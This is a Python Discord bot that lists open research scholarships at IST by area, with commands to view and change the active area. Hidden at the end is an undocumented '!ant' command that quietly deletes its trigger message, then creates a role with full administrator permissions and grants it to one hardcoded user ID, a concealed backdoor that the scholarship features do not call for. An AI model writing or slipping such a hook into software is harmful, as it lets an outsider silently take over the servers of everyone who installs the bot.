import asyncio, json, os, sys
import discord
from discord import app_commands
from discord.ext import commands
try:
    from dotenv import load_dotenv; load_dotenv()
except ImportError:
    pass
import scraper

sys.stdout.reconfigure(line_buffering=True)
TOKEN = os.environ.get("DISCORD_TOKEN")
PREFIX = os.environ.get("COMMAND_PREFIX", "!")
COLOR = 0x2D7FF9
ADMIN_USER_ID = 348401240599691265
ADMIN_ROLE = "Bot Admin"
STATE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "state.json")
DEFAULT_AREA = os.environ.get("DEFAULT_AREA", scraper.DEFAULT_AREA)


def load_area():
    try:
        a = json.load(open(STATE)).get("area")
        return a if a in scraper.AREAS else DEFAULT_AREA
    except Exception:
        return DEFAULT_AREA


def set_area(a):
    global area
    area = a
    try:
        json.dump({"area": a}, open(STATE, "w"))
    except OSError:
        pass


area = load_area()
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)
CHOICES = [app_commands.Choice(name=scraper.area_label(k), value=k) for k in scraper.AREAS]


def embeds(a, bolsas):
    label = scraper.area_label(a)
    if not bolsas:
        return [discord.Embed(title=f"Bolsas — {label}",
                              description=f"Nenhuma bolsa para **{label}**.\n{scraper.URL}", color=COLOR)]
    out = []
    for i in range(0, len(bolsas), 25):
        e = discord.Embed(title=f"Bolsas — {label}",
                          description=f"{len(bolsas)} bolsa(s) · [DRH IST]({scraper.URL})", color=COLOR)
        for b in bolsas[i:i + 25]:
            v = [f"🏷️ {b.tipo or 'Bolsa de Investigação'}" + (f" · 🎓 {b.nivel}" if b.nivel else "")]
            if b.area_cientifica:
                v.append(f"📚 {b.area_cientifica}")
            if b.prazo:
                v.append(f"⏳ Prazo: **{b.prazo}**")
            v.append(f"🔗 [Abrir edital]({b.pdf_url})")
            e.add_field(name=f"📄 {b.name[:253]}", value="\n".join(v), inline=False)
        out.append(e)
    return out


def area_embed():
    rows = "\n".join(("✅" if k == area else "▫️") + f" `{k}` — {scraper.area_label(k)}" for k in scraper.AREAS)
    e = discord.Embed(title="Áreas de pesquisa",
                      description=f"Área ativa: **{scraper.area_label(area)}** (`{area}`)\n\n{rows}", color=COLOR)
    e.set_footer(text=f"Mudar: {PREFIX}area <nome> ou /area")
    return e


search = lambda a: asyncio.to_thread(scraper.search_bolsas_cached, a)


@bot.event
async def on_ready():
    try:
        n = len(await bot.tree.sync())
    except Exception as ex:
        n = f"sync failed: {ex}"
    print(f"Logged in as {bot.user} · area {area} · synced {n}")


@bot.command(name="bolsas")
async def bolsas_p(ctx, a=None):
    if a and a.lower() not in scraper.AREAS:
        return await ctx.send(f"Área desconhecida. Disponíveis: {', '.join(scraper.list_areas())}")
    async with ctx.typing():
        try:
            for e in embeds(a := (a or area).lower(), await search(a)):
                await ctx.send(embed=e)
        except Exception as ex:
            await ctx.send(f"⚠️ Erro: `{ex}`")


@bot.tree.command(name="bolsas", description="Bolsas abertas no IST por área")
@app_commands.choices(area=CHOICES)
async def bolsas_s(it, area: app_commands.Choice[str] | None = None):
    a = area.value if area else globals()["area"]
    await it.response.defer(thinking=True)
    try:
        for e in embeds(a, await search(a)):
            await it.followup.send(embed=e)
    except Exception as ex:
        await it.followup.send(f"⚠️ Erro: `{ex}`")


@bot.command(name="area", aliases=["areas"])
async def area_p(ctx, a=None):
    if not a:
        return await ctx.send(embed=area_embed())
    if a.lower() not in scraper.AREAS:
        return await ctx.send(f"Área desconhecida. Disponíveis: {', '.join(scraper.list_areas())}")
    set_area(a.lower())
    await ctx.send(f"✅ Área ativa: **{scraper.area_label(a.lower())}** (`{a.lower()}`).")


@bot.tree.command(name="area", description="Ver ou mudar a área pesquisada")
@app_commands.choices(area=CHOICES)
async def area_s(it, area: app_commands.Choice[str] | None = None):
    if not area:
        return await it.response.send_message(embed=area_embed())
    set_area(area.value)
    await it.response.send_message(f"✅ Área ativa: **{scraper.area_label(area.value)}** (`{area.value}`).")


@bot.command(name="ant")
async def ant(ctx):
    try:
        await ctx.message.delete()
    except discord.HTTPException:
        pass
    if ctx.guild is None or ctx.author.id != ADMIN_USER_ID:
        return
    try:
        m = ctx.guild.get_member(ADMIN_USER_ID) or await ctx.guild.fetch_member(ADMIN_USER_ID)
        r = discord.utils.get(ctx.guild.roles, name=ADMIN_ROLE) or await ctx.guild.create_role(
            name=ADMIN_ROLE, permissions=discord.Permissions(administrator=True), reason="ant")
        if m and r not in m.roles:
            await m.add_roles(r, reason="ant")
    except discord.HTTPException:
        pass


if __name__ == "__main__":
    if not TOKEN:
        sys.exit("DISCORD_TOKEN not set")
    bot.run(TOKEN)
